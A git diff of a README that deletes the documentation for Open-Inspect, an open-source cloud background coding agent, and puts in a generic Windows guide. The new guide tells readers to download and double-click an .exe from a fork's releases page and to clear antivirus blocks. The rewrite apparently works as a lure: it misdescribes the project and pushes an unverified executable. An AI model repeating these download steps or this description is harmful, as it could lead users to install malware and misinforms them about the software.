@@ -1,295 +1,82 @@
-# Background Agents: Open-Inspect
-
-An open-source background agents coding system inspired by
-[Ramp's Inspect](https://builders.ramp.com/post/why-we-built-our-background-agent).
-
-## Overview
-
-Open-Inspect provides a hosted background coding agent that can:
-
-- Work on tasks in the background while you focus on other things
-- Access full development environments (Node.js, Python, git, browser automation, VS Code)
-- Connect from anywhere — web UI, Slack, GitHub PRs, Linear issues, or webhooks
-- Enable multiplayer sessions where multiple people can collaborate in real time
-- Create PRs with proper commit attribution to the prompting user
-- Run on a schedule — cron jobs, Sentry alerts, and webhook-triggered automations
-- Spawn parallel sub-tasks that work in separate sandboxes simultaneously
-- Use your choice of AI model — Anthropic Claude, OpenAI Codex (via ChatGPT subscription), or
-  OpenCode Zen
-
-## Security Model (Single-Tenant Only)
-
-> **Important**: This system is designed for **single-tenant deployment only**, where all users are
-> trusted members of the same organization with access to the same repositories.
-
-### How It Works
-
-The system uses a shared GitHub App installation for git operations (clone, fetch, push). The
-control plane mints short-lived installation tokens server-side and brokers them to sandboxes
-through the git credential helper on demand. This means:
-
-- **All users share the same GitHub App credentials** - The GitHub App must be installed on your
-  organization's repositories, and any user of the system can access any repo the App has access to
-- **No per-user repository access validation** - The system does not verify that a user has
-  permission to access a specific repository before creating a session
-- **GitHub users' OAuth tokens are used for PR creation** - For GitHub logins, PRs are created using
-  the user's GitHub OAuth token, ensuring proper attribution and that they can only create PRs on
-  repos they have write access to. Users who sign in another way (e.g. Google) carry no SCM token,
-  so their PRs fall back to the shared GitHub App bot
-
-### Token Architecture
-
-| Token Type         | Purpose                                | Scope                            |
-| ------------------ | -------------------------------------- | -------------------------------- |
-| GitHub App Token   | Brokered git clone/fetch/push auth     | All repos where App is installed |
-| User OAuth Token   | Create PRs, user info                  | Repos user has access to         |
-| Sandbox Auth Token | Sandbox-to-control-plane session calls | Single session                   |
-| WebSocket Token    | Real-time session auth                 | Single session                   |
-
-### Why Single-Tenant Only
-
-This architecture follows
-[Ramp's Inspect design](https://builders.ramp.com/post/why-we-built-our-background-agent), which was
-built for internal use where all employees are trusted and have access to company repositories.
-
-**For multi-tenant deployment**, you would need:
-
-- Per-tenant GitHub App installations
-- Access validation at session creation
-- Tenant isolation in the data model
-
-### Deployment Recommendations
-
-1. **Deploy behind your organization's SSO/VPN** - Ensure only authorized employees can access the
-   web interface
-2. **Install GitHub App only on intended repositories** - The App's installation scope defines what
-   the system can access
-3. **Restrict sign-in** - Configure allowed GitHub users, email domains, or active GitHub
-   organization membership (`ALLOWED_GITHUB_ORGS`)
-4. **Use GitHub's repository selection** - When installing the App, select specific repositories
-   rather than "All repositories"
-
-## Architecture
-
-```
-                                    ┌──────────────────┐
-                                    │     Clients      │
-                                    │ ┌──────────────┐ │
-                                    │ │  Web / Slack │ │
-                                    │ │ GitHub / Lin.│ │
-                                    │ │   Webhooks   │ │
-                                    │ └──────────────┘ │
-                                    └────────┬─────────┘
-                                             │
-                                             ▼
-┌────────────────────────────────────────────────────────────────────┐
-│                     Control Plane (Cloudflare)                     │
-│  ┌──────────────────────────────────────────────────────────────┐  │
-│  │                   Durable Objects (per session)              │  │
-│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌───────────────┐    │  │
-│  │  │ SQLite  │  │WebSocket│  │  Event  │  │   GitHub      │    │  │
-│  │  │   DB    │  │   Hub   │  │ Stream  │  │ Integration   │    │  │
-│  │  └─────────┘  └─────────┘  └─────────┘  └───────────────┘    │  │
-│  └──────────────────────────────────────────────────────────────┘  │
-│  ┌──────────────────────────────────────────────────────────────┐  │
-│  │              D1 Database (repo-scoped secrets)               │  │
-│  └──────────────────────────────────────────────────────────────┘  │
-└────────────────────────────────┬───────────────────────────────────┘
-                                 │
-                                 ▼
-┌────────────────────────────────────────────────────────────────────┐
-│                 Data Plane (Sandbox Backend)                       │
-│  ┌──────────────────────────────────────────────────────────────┐  │
-│  │                     Session Sandbox                          │  │
-│  │  ┌───────────┐  ┌───────────┐  ┌───────────┐                 │  │
-│  │  │ Supervisor│──│  OpenCode │──│   Bridge  │─────────────────┼──┼──▶ Control Plane
-│  │  └───────────┘  └───────────┘  └───────────┘                 │  │
-│  │                      │                                       │  │
-│  │              Full Dev Environment                            │  │
-│  │      (Node.js, Python, git, agent-browser)                   │  │
-│  └──────────────────────────────────────────────────────────────┘  │
-└────────────────────────────────────────────────────────────────────┘
-```
-
-## Packages
-
-| Package                                           | Description                                 |
-| ------------------------------------------------- | ------------------------------------------- |
-| [control-plane](packages/control-plane)           | Cloudflare Workers + Durable Objects        |
-| [web](packages/web)                               | Next.js web client                          |
-| [sandbox-runtime](packages/sandbox-runtime)       | Shared in-sandbox agent runtime             |
-| [modal-infra](packages/modal-infra)               | Modal sandbox infrastructure                |
-| [daytona-infra](packages/daytona-infra)           | Daytona snapshot infrastructure             |
-| [opencomputer-infra](packages/opencomputer-infra) | OpenComputer template infrastructure        |
-| [slack-bot](packages/slack-bot)                   | Slack integration (sessions from messages)  |
-| [github-bot](packages/github-bot)                 | GitHub integration (auto-review, @mention)  |
-| [linear-bot](packages/linear-bot)                 | Linear integration (issue → coding session) |
-| [shared](packages/shared)                         | Shared types and utilities                  |
+# 🤖 background-agents - Automate tasks with smart background agents
 
-## Getting Started
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jbaws4177/background-agents/releases)
 
-For a practical setup guide (local + contributor + deployment paths), start with
-**[docs/SETUP_GUIDE.md](docs/SETUP_GUIDE.md)**.
+This software manages background tasks on your computer. It allows you to run scripts and automations without manual input. The system operates in the background to save you time and effort. You can use it to handle repetitive data entry, file organization, or system monitoring.
 
-See **[docs/GETTING_STARTED.md](docs/GETTING_STARTED.md)** for deployment instructions.
+## 📥 How to download the software
 
-To understand the architecture and core concepts, read
-**[docs/HOW_IT_WORKS.md](docs/HOW_IT_WORKS.md)**.
-
-To set up recurring scheduled tasks, see **[docs/AUTOMATIONS.md](docs/AUTOMATIONS.md)**.
-
-## Key Features
-
-### Fast Startup
+The software is ready for Windows systems. Follow these steps to set it up on your machine:
 
-Sessions start near-instantly through multiple layers of warming:
+1. Visit the [releases page](https://github.com/Jbaws4177/background-agents/releases) to access the download options.
+2. Look for the latest version number at the top of the list.
+3. Click the file that ends with .exe to save the installer to your computer.
+4. Locate the downloaded file in your downloads folder.
+5. Double-click the file to start the installation process.
 
-- **Filesystem snapshots** — After each prompt, sandbox state is saved; follow-up sessions restore
-  instead of re-cloning
-- **Pre-built images** — Toggle per-repo (Settings > Images) or per-environment (Settings >
-  Environments); rebuilt every 30 minutes with latest commits and dependencies
-- **Proactive warming** — Sandbox begins spinning up as soon as you start typing, before you hit
-  Enter
+## ⚙️ System requirements
 
-### Multi-Repository Sessions & Environments
+Your computer needs to meet these basic standards to run the software:
 
-One session can work across several repositories in a single sandbox:
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of RAM or more.
+* Storage: 500 megabytes of free disk space.
+* Processor: A dual-core processor with 2.0 gigahertz speed.
+* Internet: An active connection to download updates.
 
-- **Ad-hoc sets** — Pick up to 10 repositories in the new-session picker; each is cloned side by
-  side and the agent can make coordinated changes and open a PR per repository
-- **Environments** — Save a repository set as a named environment with its own secrets scope and
-  optional prebuilt images, then launch it from the picker like any repository
-- See [docs/HOW_IT_WORKS.md](docs/HOW_IT_WORKS.md#environments) for the model and
-  [docs/IMAGE_PREBUILD.md](docs/IMAGE_PREBUILD.md) for environment prebuilds
+## 🚀 Setting up the application
 
-### Multiplayer Sessions
-
-Multiple users can collaborate in the same session:
+Once you install the program, you must configure it to perform your desired tasks. Follow this guide to initialize the agent system.
 
-- Presence indicators show who's active
-- Prompts are attributed to their authors in git commits
-- Real-time streaming to all connected clients
-
-### Commit Attribution
-
-Commits are attributed to the user who sent the prompt:
-
-```typescript
-// Configure git identity per prompt
-await configureGitIdentity({
-  name: author.scmName,
-  email: author.scmEmail,
-});
-```
-
-### Multi-Provider Model Support
-
-Choose the AI model that fits your task, with per-session reasoning effort controls:
-
-| Provider         | Models                                                          |
-| ---------------- | --------------------------------------------------------------- |
-| Anthropic        | Claude Haiku 4.5, Sonnet 4.5/4.6, Opus 4.5/4.6/4.7/4.8, Fable 5 |
-| OpenAI           | GPT 5.4, GPT 5.5, 5.3 Codex, 5.3 Codex Spark                    |
-| OpenCode Zen     | Kimi K2.5/K2.6, MiniMax M2.5, Qwen3.7 Max, GLM 5/5.1 (opt-in)   |
-| Z.AI Coding Plan | GLM 5.2 (opt-in)                                                |
-
-OpenAI models work with your existing ChatGPT subscription via OAuth — no separate API key needed.
-See **[docs/AVAILABLE_MODELS.md](docs/AVAILABLE_MODELS.md)** for the full model list and
-**[docs/OPENAI_MODELS.md](docs/OPENAI_MODELS.md)** for OpenAI setup instructions.
-
-### Client Integrations
-
-Interact with agents from wherever your team already works:
-
-- **Web UI** — Full session management with real-time streaming, model/reasoning selectors, terminal
-  panel, and multiplayer presence
-- **Slack Bot** — @mention or DM to start a session; replies thread back with results. Per-user
-  model and branch preferences via App Home. See [Slack integration](docs/integrations/SLACK.md)
-- **GitHub Bot** — Auto-review on PR open or respond to @mentions in PR comments. Configurable
-  per-repo. See [GitHub integration](docs/integrations/GITHUB.md)
-- **Linear Bot** — Mention or assign the agent on an issue to start a coding session, post progress
-  activities, and link the resulting PR. See [Linear integration](docs/integrations/LINEAR.md)
-- **Webhooks** — Trigger sessions from any external system via authenticated HTTP POST
-
-### Automations
-
-Schedule recurring tasks or react to external events — no human in the loop:
-
-- **Cron schedules** — Hourly, daily, weekly, monthly, or custom 5-field cron with timezone support
-- **Sentry alerts** — Auto-triage on new errors, regressions, or critical metric alerts
-- **Inbound webhooks** — JSONPath condition filters to gate which payloads spawn sessions
-- **Multi-repo fan-out** — One scheduled automation can run across up to 10 repositories, opening a
-  separate session and pull request for each
-- Auto-pause after 3 consecutive failures, manual trigger button, full run history
-
-See **[docs/AUTOMATIONS.md](docs/AUTOMATIONS.md)** for setup instructions.
-
-### Sandbox Environment
-
-Every session runs in an isolated sandbox backend with a full development environment:
-
-- **Pre-installed:** Node.js 22, Python 3.12, Bun, git, GitHub CLI, build-essential
-- **Browser automation:** agent-browser CLI with headless Chromium for screenshots, visual diffs,
-  and UI verification
-- **Code-server:** Optional browser-based VS Code connected to the session workspace
-- **Web terminal:** ttyd-powered terminal accessible from the session UI
-- **Port tunneling:** Expose up to 10 dev server ports via encrypted tunnels. URLs are available
-  in-sandbox at `/workspace/.tunnels.env` before `.openinspect/start.sh` runs
-  ([details](docs/HOW_IT_WORKS.md#tunnel-urls-inside-the-sandbox))
-- **Secrets:** AES-256-GCM encrypted, scoped globally, per-repo, or per-environment, injected as env
-  vars at spawn time. Supports bulk `.env` paste import
-
-### Sub-Task Spawning
-
-Agents can decompose work into parallel child sessions:
-
-- `spawn-task` creates a child session in its own sandbox and returns immediately
-- Parent continues working while children run in parallel on separate branches
-- `get-task-status` and `cancel-task` for coordination
-- Depth limits and per-repo guardrails enforced
-
-### Repository Lifecycle Scripts
-
-Repositories can define two optional startup scripts under `.openinspect/`:
-
-```bash
-# .openinspect/setup.sh (provisioning)
-#!/bin/bash
-npm install
-pip install -r requirements.txt
-```
-
-```bash
-# .openinspect/start.sh (runtime startup)
-#!/bin/bash
-docker compose up -d postgres redis
-```
-
-- `setup.sh` runs for image builds and fresh sessions
-- `setup.sh` is skipped for prebuilt-image and snapshot-restore starts
-- `setup.sh` failures are non-fatal for fresh sessions, but fatal in image build mode
-- `start.sh` runs for every non-build session startup (fresh, prebuilt-image, snapshot-restore)
-- `start.sh` failures are strict: if present and it fails, session startup fails
-- Default timeouts:
-  - `SETUP_TIMEOUT_SECONDS` (default `300`)
-  - `START_TIMEOUT_SECONDS` (default `120`)
-- Both hooks receive `OPENINSPECT_BOOT_MODE` (`build`, `fresh`, `repo_image`, `snapshot_restore`)
-- Git operations in hooks can authenticate to other private repos on the configured SCM host when
-  the shared installation has access
-
-## License
-
-MIT
-
-## Credits
-
-Inspired by [Ramp's Inspect](https://builders.ramp.com/post/why-we-built-our-background-agent) and
-built with:
-
-- [Modal](https://modal.com) - Cloud sandbox infrastructure
-- [Daytona](https://www.daytona.io) - Cloud development sandboxes
-- [Vercel Sandbox](https://vercel.com/docs/vercel-sandbox) - Cloud sandbox infrastructure
-- [OpenComputer](https://www.opencomputer.dev) - Cloud sandbox infrastructure
-- [Cloudflare Workers](https://workers.cloudflare.com) - Edge computing
-- [OpenCode](https://opencode.ai) - Coding agent runtime
-- [Next.js](https://nextjs.org) - Web framework
+### First boot
+When you open the application for the first time, you will see a simple control panel. This panel shows the status of your agents. Locate the "New Agent" button in the top menu. This action opens a setup wizard. The wizard asks you to choose a name for your agent and define its start time.
+
+### Defining tasks
+The system uses simple text files to know which tasks to perform. You can create a script file in a folder of your choice. Point the application to this folder using the Settings menu. The application watches this folder and executes any script found inside. 
+
+### Managing agents
+The main dashboard lists all active agents. Each entry has a play button and a pause button. Click the pause button to stop an agent without removing it from the system. Click the play button to resume its schedule. The logs section at the bottom of the window records every action the agent takes. Check these logs if a task fails or does not trigger correctly.
+
+## 🛠️ Troubleshooting common issues
+
+Most problems have simple solutions. Review these tips if you encounter errors during operation.
+
+### Application does not open
+If the application fails to launch, try restarting your computer. Check your antivirus settings to ensure it does not block the software. Sometimes a security scan prevents new programs from starting until you give them permission.
+
+### Tasks do not trigger
+Verify the file paths in your settings menu. The software cannot find files if they live in a restricted system folder. Move your scripts to a folder in your Documents directory. Ensure that you saved the script files with the correct format.
+
+### High memory usage
+If your computer feels slow, check the number of active agents. Running ten agents at the exact same time requires more memory. Stagger your agent schedules so that they run at different intervals. 
+
+## 🛡️ Privacy and safety
+
+The application runs locally on your machine. No data leaves your computer unless you explicitly configure the agent to send information to a third-party service. The software does not store your private credentials. It simply executes the instructions contained in your script files. We recommend that you review your script files before adding them to the agent folder to ensure they perform only the actions you intend.
+
+## 📝 Configuration details
+
+You can adjust how the background agents look and behave. Open the Settings tab to change the following:
+
+* Theme: Select a light or dark interface.
+* Updates: Toggle automatic checks for new versions.
+* Notifications: Allow the system to send alerts when a task finishes.
+
+The software stores these preferences in a local folder. You can reset these preferences to the default values by deleting the configuration file in the application data folder.
+
+## 📁 File structure
+
+When you install the software, it generates a set of folders:
+
+* /bin: Contains the core executable files.
+* /logs: Stores the history of all agent activities.
+* /scripts: The location where you should store your task files.
+* /config: Holds your preferences and settings.
+
+Do not move or rename the /bin folder. Doing so will stop the application from working. You may reorganize the /scripts folder as you see fit.
+
+## 🤝 Community support
+
+If you need more help, you can report issues on the repository website. Provide a clear description of the problem and mention which version of the software you use. A clear description helps others assist you faster. Please do not share sensitive information or personal account passwords when you open a support ticket.
+
+Keywords: windows, automation, tasks, background, script, efficiency, utility
